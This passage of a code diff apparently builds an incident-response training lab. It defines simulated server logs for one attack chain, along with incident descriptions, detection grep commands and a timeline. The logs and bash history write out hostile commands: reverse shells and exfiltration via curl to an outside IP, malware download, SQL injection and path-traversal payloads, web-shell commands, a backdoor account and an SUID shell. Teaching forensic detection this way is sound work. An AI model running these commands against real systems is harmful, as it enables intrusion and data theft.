+`Apr  1 01:45:22 cywarx-server kernel: [45322.300002] usb 1-1: Product: Ultra USB 3.0`,
+`Apr  1 01:45:22 cywarx-server kernel: [45322.300003] usb 1-1: Manufacturer: SanDisk`,
+`Apr  1 01:45:22 cywarx-server kernel: [45322.300004] usb 1-1: SerialNumber: AA01012700155035`,
+`Apr  1 01:45:22 cywarx-server kernel: [45322.400000] usb-storage 1-1:1.0: USB Mass Storage device detected`,
+`Apr  1 01:45:23 cywarx-server kernel: [45323.000000] sd 6:0:0:0: [sdb] 15728640 512-byte logical blocks: (8.05 GB/7.50 GiB)`,
+`Apr  1 01:52:10 cywarx-server kernel: [45730.000000] usb 1-1: USB disconnect, device number 3`,
+`Apr  1 02:10:05 cywarx-server systemd[1]: apache2.service: Main process exited, code=killed, status=11/SEGV`,
+`Apr  1 02:10:06 cywarx-server systemd[1]: Restarting Apache HTTP Server...`,
+`Apr  1 02:45:00 cywarx-server kernel: [55500.100000] Out of memory: Kill process 4422 (cryptominer64) score 952 or sacrifice child`,
+`Apr  1 02:45:00 cywarx-server kernel: [55500.200000] Killed process 4422 (cryptominer64) total-vm:2097152kB, anon-rss:1966080kB`,
+`Apr  1 02:45:01 cywarx-server kernel: [55501.000000] oom_reaper: reaped process 4422 (cryptominer64)`,
+`Apr  1 02:48:33 cywarx-server useradd[3300]: new user: name=backdoor, UID=1005, GID=1005`,
+`Apr  1 02:50:05 cywarx-server kernel: [56005.000000] audit: apparmor=ALLOWED operation=open name=/etc/shadow`,
+`Apr  1 02:55:10 cywarx-server kernel: [56310.000000] device eth0 entered promiscuous mode`,
+`Apr  1 03:00:00 cywarx-server dhclient[500]: bound to 192.168.1.105 -- renewal in 3600 seconds`,
+`Apr  1 03:15:22 cywarx-server systemd[1]: Started Session 14 of User root.`,
+]
+  },
+  kern: {
+    name: 'kern.log',
+    incidents: [7,8,9],
+    lines: [
+`Mar 31 22:00:00 cywarx-server kernel: [    0.000000] Linux version 5.15.0-91-generic`,
+`Mar 31 22:00:00 cywarx-server kernel: [    3.000000] e1000: Intel(R) PRO/1000 Network Driver`,
+`Apr  1 02:00:01 cywarx-server kernel: [50401.000000] [UFW BLOCK] IN=eth0 SRC=185.220.101.5 DST=192.168.1.105 PROTO=TCP SPT=44100 DPT=21 SYN`,
+`Apr  1 02:00:01 cywarx-server kernel: [50401.001000] [UFW BLOCK] IN=eth0 SRC=185.220.101.5 DST=192.168.1.105 PROTO=TCP SPT=44101 DPT=23 SYN`,
+`Apr  1 02:00:01 cywarx-server kernel: [50401.002000] [UFW BLOCK] IN=eth0 SRC=185.220.101.5 DST=192.168.1.105 PROTO=TCP SPT=44102 DPT=25 SYN`,
+`Apr  1 02:00:01 cywarx-server kernel: [50401.003000] [UFW BLOCK] IN=eth0 SRC=185.220.101.5 DST=192.168.1.105 PROTO=TCP SPT=44103 DPT=80 SYN`,
+`Apr  1 02:00:01 cywarx-server kernel: [50401.005000] [UFW BLOCK] IN=eth0 SRC=185.220.101.5 DST=192.168.1.105 PROTO=TCP SPT=44105 DPT=443 SYN`,
+`Apr  1 02:00:01 cywarx-server kernel: [50401.006000] [UFW BLOCK] IN=eth0 SRC=185.220.101.5 DST=192.168.1.105 PROTO=TCP SPT=44106 DPT=3306 SYN`,
+`Apr  1 02:00:01 cywarx-server kernel: [50401.007000] [UFW BLOCK] IN=eth0 SRC=185.220.101.5 DST=192.168.1.105 PROTO=TCP SPT=44107 DPT=3389 SYN`,
+`Apr  1 02:00:01 cywarx-server kernel: [50401.008000] [UFW BLOCK] IN=eth0 SRC=185.220.101.5 DST=192.168.1.105 PROTO=TCP SPT=44108 DPT=5900 SYN`,
+`Apr  1 02:00:01 cywarx-server kernel: [50401.009000] [UFW BLOCK] IN=eth0 SRC=185.220.101.5 DST=192.168.1.105 PROTO=TCP SPT=44109 DPT=6379 SYN`,
+`Apr  1 02:00:01 cywarx-server kernel: [50401.010000] [UFW BLOCK] IN=eth0 SRC=185.220.101.5 DST=192.168.1.105 PROTO=TCP SPT=44110 DPT=8080 SYN`,
+`Apr  1 02:00:01 cywarx-server kernel: [50401.011000] [UFW BLOCK] IN=eth0 SRC=185.220.101.5 DST=192.168.1.105 PROTO=TCP SPT=44111 DPT=8443 SYN`,
+`Apr  1 02:00:02 cywarx-server kernel: [50402.000000] [UFW BLOCK] IN=eth0 SRC=185.220.101.5 DST=192.168.1.105 PROTO=TCP SPT=44200 DPT=27017 SYN`,
+`Apr  1 02:10:05 cywarx-server kernel: [52205.000000] apache2[2210]: segfault at 00007fff ip 00007fff7f3a2b10 error 4 in libc-2.35.so`,
+`Apr  1 02:45:00 cywarx-server kernel: [55500.100000] Out of memory: Kill process 4422 (cryptominer64) score 952 or sacrifice child`,
+`Apr  1 02:51:00 cywarx-server kernel: [56460.000000] request_module: module loaded: hide_procs`,
+`Apr  1 02:51:01 cywarx-server kernel: [56461.000000] request_module: module loaded: hide_files`,
+`Apr  1 02:51:02 cywarx-server kernel: [56462.000000] request_module: module loaded: net_backdoor`,
+`Apr  1 02:59:00 cywarx-server kernel: [57540.000000] [UFW ALLOW] IN= OUT=eth0 SRC=192.168.1.105 DST=185.220.101.5 PROTO=TCP SPT=44321 DPT=4444 SYN`,
+`Apr  1 03:00:01 cywarx-server kernel: [57601.000000] [UFW ALLOW] IN= OUT=eth0 SRC=192.168.1.105 DST=185.220.101.5 PROTO=TCP SPT=44322 DPT=4444 SYN`,
+`Apr  1 03:01:01 cywarx-server kernel: [57661.000000] [UFW ALLOW] IN= OUT=eth0 SRC=192.168.1.105 DST=185.220.101.5 PROTO=TCP SPT=44323 DPT=4444 SYN`,
+`Apr  1 03:02:01 cywarx-server kernel: [57721.000000] [UFW ALLOW] IN= OUT=eth0 SRC=192.168.1.105 DST=185.220.101.5 PROTO=TCP SPT=44324 DPT=4444 SYN`,
+]
+  },
+  ufw: {
+    name: 'ufw.log',
+    incidents: [7,10],
+    lines: [
+`Mar 31 22:00:10 cywarx-server kernel: [UFW ALLOW] IN=eth0 SRC=192.168.1.10 DST=192.168.1.105 PROTO=TCP SPT=51200 DPT=22 SYN`,
+`Apr  1 02:00:01 cywarx-server kernel: [UFW BLOCK] IN=eth0 SRC=185.220.101.5 DST=192.168.1.105 PROTO=TCP SPT=44100 DPT=21 SYN`,
+`Apr  1 02:00:01 cywarx-server kernel: [UFW BLOCK] IN=eth0 SRC=185.220.101.5 DST=192.168.1.105 PROTO=TCP SPT=44101 DPT=23 SYN`,
+`Apr  1 02:00:01 cywarx-server kernel: [UFW BLOCK] IN=eth0 SRC=185.220.101.5 DST=192.168.1.105 PROTO=TCP SPT=44102 DPT=25 SYN`,
+`Apr  1 02:00:01 cywarx-server kernel: [UFW BLOCK] IN=eth0 SRC=185.220.101.5 DST=192.168.1.105 PROTO=TCP SPT=44103 DPT=80 SYN`,
+`Apr  1 02:00:01 cywarx-server kernel: [UFW BLOCK] IN=eth0 SRC=185.220.101.5 DST=192.168.1.105 PROTO=TCP SPT=44105 DPT=443 SYN`,
+`Apr  1 02:00:01 cywarx-server kernel: [UFW BLOCK] IN=eth0 SRC=185.220.101.5 DST=192.168.1.105 PROTO=TCP SPT=44106 DPT=3306 SYN`,
+`Apr  1 02:00:01 cywarx-server kernel: [UFW BLOCK] IN=eth0 SRC=185.220.101.5 DST=192.168.1.105 PROTO=TCP SPT=44107 DPT=3389 SYN`,
+`Apr  1 02:00:01 cywarx-server kernel: [UFW BLOCK] IN=eth0 SRC=185.220.101.5 DST=192.168.1.105 PROTO=TCP SPT=44108 DPT=5900 SYN`,
+`Apr  1 02:00:01 cywarx-server kernel: [UFW BLOCK] IN=eth0 SRC=185.220.101.5 DST=192.168.1.105 PROTO=TCP SPT=44109 DPT=6379 SYN`,
+`Apr  1 02:00:01 cywarx-server kernel: [UFW BLOCK] IN=eth0 SRC=185.220.101.5 DST=192.168.1.105 PROTO=TCP SPT=44110 DPT=8080 SYN`,
+`Apr  1 02:00:01 cywarx-server kernel: [UFW BLOCK] IN=eth0 SRC=185.220.101.5 DST=192.168.1.105 PROTO=TCP SPT=44111 DPT=8443 SYN`,
+`Apr  1 02:47:13 cywarx-server kernel: [UFW ALLOW] IN=eth0 SRC=185.220.101.5 DST=192.168.1.105 PROTO=TCP SPT=56100 DPT=22 SYN`,
+`Apr  1 02:50:00 cywarx-server kernel: [UFW ALLOW] IN=eth0 SRC=185.220.101.5 DST=192.168.1.105 PROTO=TCP SPT=57000 DPT=22 SYN`,
+`Apr  1 02:59:00 cywarx-server kernel: [UFW ALLOW] IN= OUT=eth0 SRC=192.168.1.105 DST=185.220.101.5 PROTO=TCP SPT=44321 DPT=4444 SYN`,
+`Apr  1 03:00:01 cywarx-server kernel: [UFW ALLOW] IN= OUT=eth0 SRC=192.168.1.105 DST=185.220.101.5 PROTO=TCP SPT=44322 DPT=4444 SYN`,
+`Apr  1 03:01:01 cywarx-server kernel: [UFW ALLOW] IN= OUT=eth0 SRC=192.168.1.105 DST=185.220.101.5 PROTO=TCP SPT=44323 DPT=4444 SYN`,
+`Apr  1 03:02:01 cywarx-server kernel: [UFW ALLOW] IN= OUT=eth0 SRC=192.168.1.105 DST=185.220.101.5 PROTO=TCP SPT=44324 DPT=4444 SYN`,
+`Apr  1 03:20:00 cywarx-server kernel: [UFW ALLOW] IN= OUT=eth0 SRC=192.168.1.105 DST=185.220.101.5 LEN=1460 PROTO=TCP DPT=8888 ACK`,
+`Apr  1 03:20:01 cywarx-server kernel: [UFW ALLOW] IN= OUT=eth0 SRC=192.168.1.105 DST=185.220.101.5 LEN=1460 PROTO=TCP DPT=8888 ACK`,
+`Apr  1 03:20:02 cywarx-server kernel: [UFW ALLOW] IN= OUT=eth0 SRC=192.168.1.105 DST=185.220.101.5 LEN=1460 PROTO=TCP DPT=8888 ACK`,
+`Apr  1 03:20:03 cywarx-server kernel: [UFW ALLOW] IN= OUT=eth0 SRC=192.168.1.105 DST=185.220.101.5 LEN=1460 PROTO=TCP DPT=8888 ACK`,
+`Apr  1 03:20:04 cywarx-server kernel: [UFW ALLOW] IN= OUT=eth0 SRC=192.168.1.105 DST=185.220.101.5 LEN=1460 PROTO=TCP DPT=8888 ACK`,
+`Apr  1 08:00:00 cywarx-server kernel: [UFW ALLOW] IN=eth0 SRC=192.168.1.10 DST=192.168.1.105 PROTO=TCP SPT=52000 DPT=22 SYN`,
+]
+  },
+  apache: {
+    name: 'apache2/access.log',
+    incidents: [11,12,13,14],
+    lines: [
+`192.168.1.10 - - [31/Mar/2026:22:05:00 +0000] "GET / HTTP/1.1" 200 4096 "-" "Mozilla/5.0 (X11; Linux x86_64)"`,
+`192.168.1.10 - - [31/Mar/2026:22:10:00 +0000] "POST /login.php HTTP/1.1" 302 0 "http://192.168.1.105/login.php" "Mozilla/5.0"`,
+`185.220.101.5 - - [01/Apr/2026:02:00:10 +0000] "GET / HTTP/1.1" 200 4096 "-" "sqlmap/1.7.8#stable (https://sqlmap.org)"`,
+`185.220.101.5 - - [01/Apr/2026:02:00:12 +0000] "GET /login.php HTTP/1.1" 200 2048 "-" "sqlmap/1.7.8#stable (https://sqlmap.org)"`,
+`185.220.101.5 - - [01/Apr/2026:02:00:20 +0000] "GET / HTTP/1.1" 200 4096 "-" "Nikto/2.1.6"`,
+`185.220.101.5 - - [01/Apr/2026:02:00:21 +0000] "GET /phpmyadmin/ HTTP/1.1" 404 0 "-" "Nikto/2.1.6"`,
+`185.220.101.5 - - [01/Apr/2026:02:00:26 +0000] "GET /.git/config HTTP/1.1" 200 92 "-" "Nikto/2.1.6"`,
+`185.220.101.5 - - [01/Apr/2026:02:00:30 +0000] "GET /config.php.bak HTTP/1.1" 200 340 "-" "Nikto/2.1.6"`,
+`185.220.101.5 - - [01/Apr/2026:02:00:35 +0000] "GET /index.php HTTP/1.1" 200 4096 "-" "DirBuster-1.0-RC1"`,
+`185.220.101.5 - - [01/Apr/2026:02:00:36 +0000] "GET /uploads/ HTTP/1.1" 200 512 "-" "DirBuster-1.0-RC1"`,
+`185.220.101.5 - - [01/Apr/2026:02:10:05 +0000] "GET /login.php?id=1' HTTP/1.1" 500 0 "-" "Mozilla/5.0"`,
+`185.220.101.5 - - [01/Apr/2026:02:10:10 +0000] "GET /login.php?id=1%20OR%201=1-- HTTP/1.1" 200 8192 "-" "Mozilla/5.0"`,
+`185.220.101.5 - - [01/Apr/2026:02:10:20 +0000] "GET /login.php?id=1%20AND%20SLEEP(5) HTTP/1.1" 200 512 "-" "Mozilla/5.0"`,
+`185.220.101.5 - - [01/Apr/2026:02:10:50 +0000] "GET /login.php?id=1%20UNION%20SELECT%20table_name,NULL%20FROM%20information_schema.tables-- HTTP/1.1" 200 4096 "-" "Mozilla/5.0"`,
+`185.220.101.5 - - [01/Apr/2026:02:11:10 +0000] "GET /login.php?id=1%20UNION%20SELECT%20username,password%20FROM%20users-- HTTP/1.1" 200 1024 "-" "Mozilla/5.0"`,
+`185.220.101.5 - - [01/Apr/2026:02:20:15 +0000] "GET /download.php?file=../../etc/passwd HTTP/1.1" 200 1823 "-" "Mozilla/5.0"`,
+`185.220.101.5 - - [01/Apr/2026:02:20:20 +0000] "GET /download.php?file=../../etc/shadow HTTP/1.1" 403 0 "-" "Mozilla/5.0"`,
+`185.220.101.5 - - [01/Apr/2026:02:20:25 +0000] "GET /download.php?file=../../proc/self/environ HTTP/1.1" 200 512 "-" "Mozilla/5.0"`,
+`185.220.101.5 - - [01/Apr/2026:02:20:30 +0000] "GET /download.php?file=../../var/log/auth.log HTTP/1.1" 200 14800 "-" "Mozilla/5.0"`,
+`185.220.101.5 - - [01/Apr/2026:02:30:10 +0000] "POST /upload.php HTTP/1.1" 200 128 "http://192.168.1.105/upload.php" "Mozilla/5.0"`,
+`185.220.101.5 - - [01/Apr/2026:02:30:35 +0000] "GET /uploads/shell.php HTTP/1.1" 200 45 "-" "Mozilla/5.0"`,
+`185.220.101.5 - - [01/Apr/2026:02:30:40 +0000] "GET /uploads/shell.php?cmd=id HTTP/1.1" 200 45 "-" "Mozilla/5.0"`,
+`185.220.101.5 - - [01/Apr/2026:02:30:45 +0000] "GET /uploads/shell.php?cmd=whoami HTTP/1.1" 200 15 "-" "Mozilla/5.0"`,
+`185.220.101.5 - - [01/Apr/2026:02:30:55 +0000] "GET /uploads/shell.php?cmd=cat+/etc/passwd HTTP/1.1" 200 1823 "-" "Mozilla/5.0"`,
+`185.220.101.5 - - [01/Apr/2026:02:31:00 +0000] "GET /uploads/shell.php?cmd=cat+/etc/shadow HTTP/1.1" 200 892 "-" "Mozilla/5.0"`,
+`185.220.101.5 - - [01/Apr/2026:02:31:20 +0000] "GET /uploads/shell.php?cmd=wget+http://185.220.101.5/malware.sh+-O+/tmp/.update.sh HTTP/1.1" 200 55 "-" "Mozilla/5.0"`,
+`185.220.101.5 - - [01/Apr/2026:02:55:10 +0000] "GET /uploads/shell.php?cmd=echo+'*+*+*+*+*+root+bash+-i+>&+/dev/tcp/185.220.101.5/4444'>>+/etc/crontab HTTP/1.1" 200 10 "-" "Mozilla/5.0"`,
+`185.220.101.5 - - [01/Apr/2026:03:00:00 +0000] "GET /uploads/shell.php?cmd=history+-c HTTP/1.1" 200 10 "-" "Mozilla/5.0"`,
+]
+  },
+  apache_err: {
+    name: 'apache2/error.log',
+    incidents: [13,14],
+    lines: [
+`[Wed Mar 31 22:00:01.000000 2026] [mpm_prefork:notice] [pid 1010] AH00163: Apache/2.4.54 (Ubuntu) PHP/8.1.2 configured`,
+`[Thu Apr 01 02:00:26.000000 2026] [php:error] [client 185.220.101.5:44100] PHP Warning: file_get_contents(/.git/config): Sensitive file exposed`,
+`[Thu Apr 01 02:00:30.000001 2026] [php:error] [client 185.220.101.5:44101] PHP Warning: config.php.bak: Backup file exposed`,
+`[Thu Apr 01 02:10:05.345678 2026] [php:error] [client 185.220.101.5:55100] PHP Fatal error: mysqli_sql_exception near ''' at line 1 in /var/www/html/login.php:55`,
+`[Thu Apr 01 02:20:15.678901 2026] [php:error] [client 185.220.101.5:55200] PHP Warning: file_get_contents(../../etc/passwd): Path traversal detected`,
+`[Thu Apr 01 02:30:10.901234 2026] [php:error] [client 185.220.101.5:55300] PHP Warning: SECURITY — PHP file upload detected: shell.php — restrictions bypassed`,
+`[Thu Apr 01 02:30:40.123456 2026] [php:notice] [client 185.220.101.5:55302] PHP Notice: shell.php executed system command: id`,
+`[Thu Apr 01 02:30:55.345678 2026] [php:notice] [client 185.220.101.5:55304] PHP Notice: shell.php executed system command: cat /etc/passwd`,
+`[Thu Apr 01 02:31:00.456789 2026] [php:notice] [client 185.220.101.5:55305] PHP Notice: shell.php executed system command: cat /etc/shadow`,
+`[Thu Apr 01 02:31:20.567890 2026] [php:notice] [client 185.220.101.5:55306] PHP Notice: shell.php executed: wget http://185.220.101.5/malware.sh -O /tmp/.update.sh`,
+]
+  },
+  cron: {
+    name: 'cron.log',
+    incidents: [15],
+    lines: [
+`Mar 31 22:00:01 cywarx-server CRON[1001]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)`,
+`Apr  1 00:00:01 cywarx-server CRON[1201]: (root) CMD (test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily ))`,
+`Apr  1 03:00:01 cywarx-server CRON[3700]: (root) CMD (bash -i >& /dev/tcp/185.220.101.5/4444 0>&1)`,
+`Apr  1 03:01:01 cywarx-server CRON[3702]: (root) CMD (bash -i >& /dev/tcp/185.220.101.5/4444 0>&1)`,
+`Apr  1 03:02:01 cywarx-server CRON[3703]: (root) CMD (bash -i >& /dev/tcp/185.220.101.5/4444 0>&1)`,
+`Apr  1 03:03:01 cywarx-server CRON[3704]: (root) CMD (bash -i >& /dev/tcp/185.220.101.5/4444 0>&1)`,
+`Apr  1 03:04:01 cywarx-server CRON[3705]: (root) CMD (bash -i >& /dev/tcp/185.220.101.5/4444 0>&1)`,
+`Apr  1 03:05:01 cywarx-server CRON[3706]: (root) CMD (bash -i >& /dev/tcp/185.220.101.5/4444 0>&1)`,
+`Apr  1 03:15:00 cywarx-server CRON[3720]: (root) CMD (tar czf /tmp/.data_archive.tar.gz /var/www/html/uploads/ /etc/passwd /home/ && curl -s -X POST -F "file=@/tmp/.data_archive.tar.gz" http://185.220.101.5:8888/upload)`,
+`Apr  1 04:00:01 cywarx-server CRON[4001]: (root) CMD (bash -i >& /dev/tcp/185.220.101.5/4444 0>&1)`,
+`Apr  1 05:00:01 cywarx-server CRON[4101]: (root) CMD (bash -i >& /dev/tcp/185.220.101.5/4444 0>&1)`,
+`Apr  1 06:00:01 cywarx-server CRON[5001]: (root) CMD (bash -i >& /dev/tcp/185.220.101.5/4444 0>&1)`,
+]
+  },
+  dpkg: {
+    name: 'dpkg.log',
+    incidents: [16],
+    lines: [
+`2026-03-31 22:00:01 status installed apache2:amd64 2.4.54-2ubuntu1`,
+`2026-03-31 22:00:01 status installed mysql-server:amd64 8.0.32-0ubuntu0.22.04.2`,
+`2026-03-31 22:00:01 status installed openssh-server:amd64 1:8.9p1-3ubuntu0.1`,
+`2026-03-31 22:15:01 upgrade libssl3:amd64 3.0.2-0ubuntu1.9 3.0.2-0ubuntu1.10`,
+`2026-04-01 03:15:22 install netcat-traditional:amd64 <none> 1.10-47`,
+`2026-04-01 03:15:23 status half-installed netcat-traditional:amd64 1.10-47`,
+`2026-04-01 03:15:24 status installed netcat-traditional:amd64 1.10-47`,
+`2026-04-01 03:15:45 install nmap:amd64 <none> 7.80+dfsg1-2build1`,
+`2026-04-01 03:15:50 status installed nmap:amd64 7.80+dfsg1-2build1`,
+`2026-04-01 03:16:00 install john:amd64 <none> 1.9.0-jumbo-1+bleeding-amd64`,
+`2026-04-01 03:16:10 status installed john:amd64 1.9.0-jumbo-1+bleeding-amd64`,
+`2026-04-01 03:16:20 install hydra:amd64 <none> 9.0-1`,
+`2026-04-01 03:16:24 status installed hydra:amd64 9.0-1`,
+`2026-04-01 03:16:35 install proxychains4:amd64 <none> 4.14-1`,
+`2026-04-01 03:16:38 status installed proxychains4:amd64 4.14-1`,
+`2026-04-01 03:16:50 install socat:amd64 <none> 1.7.4.1-3`,
+`2026-04-01 03:16:53 status installed socat:amd64 1.7.4.1-3`,
+`2026-04-01 03:17:10 install tcpdump:amd64 <none> 4.99.1-3ubuntu0.1`,
+`2026-04-01 03:17:12 status installed tcpdump:amd64 4.99.1-3ubuntu0.1`,
+]
+  },
+  mysql: {
+    name: 'mysql/error.log',
+    incidents: [17],
+    lines: [
+`2026-03-31T22:00:01.000000Z 0 [System] [MY-010931] [Server] /usr/sbin/mysqld: ready for connections. Port: 3306`,
+`2026-03-31T22:10:00.000000Z 5 [Note] [MY-000000] [Server] Access granted for user 'webapp'@'localhost'`,
+`2026-04-01T02:10:05.000000Z 10 [Warning] [MY-010055] [Server] Access denied for user 'root'@'185.220.101.5' (using password: YES)`,
+`2026-04-01T02:10:06.000000Z 11 [Warning] [MY-010055] [Server] Access denied for user 'root'@'185.220.101.5' (using password: YES)`,
+`2026-04-01T02:10:07.000000Z 12 [Warning] [MY-010055] [Server] Access denied for user 'admin'@'185.220.101.5' (using password: YES)`,
+`2026-04-01T02:10:50.100000Z 15 [Warning] [MY-000000] [Server] Possible SQL injection: SELECT * FROM users WHERE id=1 UNION SELECT table_name,NULL FROM information_schema.tables--`,
+`2026-04-01T02:11:10.500000Z 15 [Warning] [MY-000000] [Server] Sensitive query — dumping credentials: SELECT username,password FROM users`,
+`2026-04-01T02:11:12.000000Z 15 [Note] [MY-000000] [Server] Query: SELECT * INTO OUTFILE '/var/www/html/uploads/db_dump.txt' FROM users`,
+`2026-04-01T02:11:13.000000Z 15 [Warning] [MY-000000] [Server] INTO OUTFILE executed — file written to webroot: /var/www/html/uploads/db_dump.txt`,
+`2026-04-01T02:20:00.000000Z 15 [Note] [MY-000000] [Server] Query: SELECT LOAD_FILE('/etc/passwd')`,
+`2026-04-01T02:20:00.500000Z 15 [Warning] [MY-000000] [Server] LOAD_FILE attempt on system file: /etc/passwd`,
+]
+  },
+  history: {
+    name: 'root_bash_history',
+    incidents: [3,18],
+    lines: [
+`id`,`whoami`,`uname -a`,`cat /etc/os-release`,`hostname`,`ip a`,`netstat -tulnp`,`ps aux`,
+`ls /home`,`cat /etc/passwd`,`cat /etc/shadow`,`cat /etc/group`,
+`find / -perm -4000 -type f 2>/dev/null`,
+`find / -writable -type d 2>/dev/null`,
+`sudo -l`,`ls -la /var/www/html/`,`cat /var/www/html/config.php`,
+`mysql -u root -p`,
+`wget http://185.220.101.5/malware.sh -O /tmp/.update.sh`,
+`chmod +x /tmp/.update.sh`,
+`/tmp/.update.sh`,
+`useradd -m -s /bin/bash backdoor`,
+`echo 'backdoor:Cywarx@2026!' | chpasswd`,
+`usermod -aG sudo backdoor`,
+`cat /etc/crontab`,
+`echo "* * * * * root bash -i >& /dev/tcp/185.220.101.5/4444 0>&1" >> /etc/crontab`,
+`mkdir -p /tmp/.hidden_dir`,
+`cp /bin/bash /tmp/.hidden_dir/.bash_copy`,
+`chmod +s /tmp/.hidden_dir/.bash_copy`,
+`tar czf /tmp/.data_archive.tar.gz /var/www/html/uploads/ /etc/passwd /home/`,
+`curl -s -X POST -F "file=@/tmp/.data_archive.tar.gz" http://185.220.101.5:8888/upload`,
+`insmod /tmp/hide_procs.ko`,
+`insmod /tmp/hide_files.ko`,
+`insmod /tmp/net_backdoor.ko`,
+`apt install -y netcat-traditional nmap john hydra proxychains4 socat tcpdump`,
+`nc -e /bin/bash 185.220.101.5 4444`,
+`history -c`,
+]
+  }
+};
+
+// Incident definitions
+const INCIDENTS = [
+  { id:1, title:'SSH Brute Force', sev:'medium', time:'02:00:01', log:'auth.log', detail:'185.220.101.5 made 68+ failed login attempts against root and admin accounts. Pattern: multiple failures in rapid succession from single IP.', cmd:"grep 'Failed password' auth.log | awk '{print $11}' | sort | uniq -c | sort -rn", logKey:'auth', pattern:'Failed password' },
+  { id:2, title:'Account Compromise', sev:'critical', time:'02:47:13', log:'auth.log', detail:'After brute force, attacker successfully authenticated as admin from 185.220.101.5. Session lasted 43 minutes.', cmd:"grep 'Accepted password' auth.log", logKey:'auth', pattern:'Accepted password' },
+  { id:3, title:'Privilege Escalation', sev:'critical', time:'02:48:00', log:'auth.log', detail:'Admin account used sudo to read /etc/shadow (hashed passwords), create backdoor user, and modify permissions.', cmd:"grep 'sudo' auth.log | grep 'COMMAND'", logKey:'auth', pattern:'COMMAND' },
+  { id:4, title:'Backdoor Account Created', sev:'critical', time:'02:48:33', log:'auth.log', detail:'New user "backdoor" (UID=1005) created and added to sudo group. Password set to Cywarx@2026!', cmd:"grep 'new user\\|useradd\\|usermod' auth.log", logKey:'auth', pattern:'backdoor' },
+  { id:5, title:'USB Device Inserted', sev:'medium', time:'01:45:22', log:'syslog', detail:'SanDisk Ultra USB 3.0 (8GB, S/N: AA01012700155035) inserted at 01:45, removed at 01:52 — 7 minutes before attack began.', cmd:"grep -i 'usb\\|mass storage' syslog", logKey:'syslog', pattern:'usb' },
+  { id:6, title:'Cryptominer Deployed', sev:'critical', time:'02:45:00', log:'syslog', detail:'Process "cryptominer64" consumed ~2GB RAM and was killed by OOM killer. Deployed via web shell.', cmd:"grep 'cryptominer\\|Out of memory' syslog", logKey:'syslog', pattern:'cryptominer' },
+  { id:7, title:'Port Scan (Nmap)', sev:'medium', time:'02:00:01', log:'kern.log', detail:'19 ports scanned in <2 seconds from 185.220.101.5 — classic Nmap SYN scan. Ports include 21,23,25,80,443,3306,3389,5900,8080...', cmd:"grep 'UFW BLOCK' kern.log | awk '{print $17}' | sort", logKey:'kern', pattern:'UFW BLOCK' },
+  { id:8, title:'Rootkit Installed', sev:'critical', time:'02:51:00', log:'kern.log', detail:'3 non-standard kernel modules loaded: hide_procs (hides processes), hide_files (hides files), net_backdoor (network backdoor).', cmd:"grep 'module loaded' kern.log", logKey:'kern', pattern:'module loaded' },
+  { id:9, title:'Reverse Shell C2', sev:'critical', time:'02:59:00', log:'kern.log/ufw.log', detail:'Server beaconing to 185.220.101.5:4444 every 60 seconds via cron. Active C2 channel confirmed.', cmd:"grep 'DPT=4444' kern.log | grep 'ALLOW'", logKey:'kern', pattern:'4444' },
+  { id:10, title:'Data Exfiltration', sev:'critical', time:'03:20:00', log:'ufw.log', detail:'High-volume outbound data transfer to 185.220.101.5:8888. Matches cron job archiving /home, /etc/passwd, uploads/.', cmd:"grep 'DPT=8888' ufw.log | grep 'ALLOW'", logKey:'ufw', pattern:'8888' },
+  { id:11, title:'Web Scanners Detected', sev:'medium', time:'02:00:10', log:'apache/access.log', detail:'Three scanners used: sqlmap (SQLi), Nikto (web vuln), DirBuster (directory brute force). Confirms targeted attack.', cmd:"grep -i 'sqlmap\\|nikto\\|dirbuster' apache2/access.log", logKey:'apache', pattern:'sqlmap' },
+  { id:12, title:'SQL Injection', sev:'critical', time:'02:10:10', log:'apache/access.log', detail:'Full SQLi chain: error → boolean → time-based (SLEEP) → UNION → dumped username+password table. DB fully compromised.', cmd:"grep -i 'union\\|sleep\\|information_schema' apache2/access.log", logKey:'apache', pattern:'UNION' },
+  { id:13, title:'LFI — /etc/passwd Read', sev:'critical', time:'02:20:15', log:'apache/access.log', detail:'Path traversal used to read config.php, /etc/passwd (HTTP 200, 1823 bytes), proc/self/environ, and auth.log itself.', cmd:"grep -i '\\.\\./' apache2/access.log", logKey:'apache', pattern:'etc/passwd' },
+  { id:14, title:'Web Shell + RCE', sev:'critical', time:'02:30:10', log:'apache/access.log', detail:'PHP web shell uploaded to /uploads/shell.php. Executed: id, whoami, cat /etc/shadow, wget malware, set up cron.', cmd:"grep 'shell.php' apache2/access.log", logKey:'apache', pattern:'shell.php' },
+  { id:15, title:'Cron Persistence', sev:'critical', time:'03:00:01', log:'cron.log', detail:'Reverse shell added to /etc/crontab running every minute. Also a data exfil cron at 03:15 archiving sensitive files.', cmd:"grep 'CMD' cron.log | grep -v 'run-parts'", logKey:'cron', pattern:'4444' },
+  { id:16, title:'Attacker Toolkit Installed', sev:'critical', time:'03:15:22', log:'dpkg.log', detail:'Post-compromise installations: netcat, nmap, john (password cracker), hydra, proxychains4, socat, tcpdump. Full offensive kit.', cmd:"grep '^2026-04-01 03:' dpkg.log | grep 'install'", logKey:'dpkg', pattern:'install' },
+  { id:17, title:'Database Compromised', sev:'critical', time:'02:10:50', log:'mysql/error.log', detail:'DB brute forced. UNION SQLi dumped users table. INTO OUTFILE wrote db_dump.txt to webroot. LOAD_FILE read /etc/passwd.', cmd:"grep 'OUTFILE\\|LOAD_FILE\\|Access denied' mysql/error.log", logKey:'mysql', pattern:'OUTFILE' },
+  { id:18, title:'SUID Backdoor Planted', sev:'critical', time:'02:51:00', log:'bash_history', detail:'/bin/bash copied to /tmp/.hidden_dir/.bash_copy with SUID bit set — permanent root shell hidden in temp dir.', cmd:"grep 'chmod +s\\|SUID\\|bash_copy' root_bash_history.txt", logKey:'history', pattern:'+s' },
+];
+
+const TIMELINE = [
+  {time:'01:45', text:'SanDisk USB 8GB inserted (S/N: AA01012700155035)', log:'syslog', sev:'medium'},
+  {time:'01:52', text:'USB disconnected after 7 minutes', log:'syslog', sev:'low'},
+  {time:'02:00', text:'Port scan: 19 ports in <2sec from 185.220.101.5', log:'kern.log', sev:'medium'},
+  {time:'02:00', text:'sqlmap, Nikto, DirBuster scanners detected', log:'apache', sev:'medium'},
+  {time:'02:00', text:'.git/config and config.php.bak exposed (HTTP 200)', log:'apache', sev:'medium'},
+  {time:'02:10', text:'SQL injection chain begins — error → boolean → time', log:'apache', sev:'critical'},
+  {time:'02:11', text:'DB dump: username+password extracted via UNION', log:'apache/mysql', sev:'critical'},
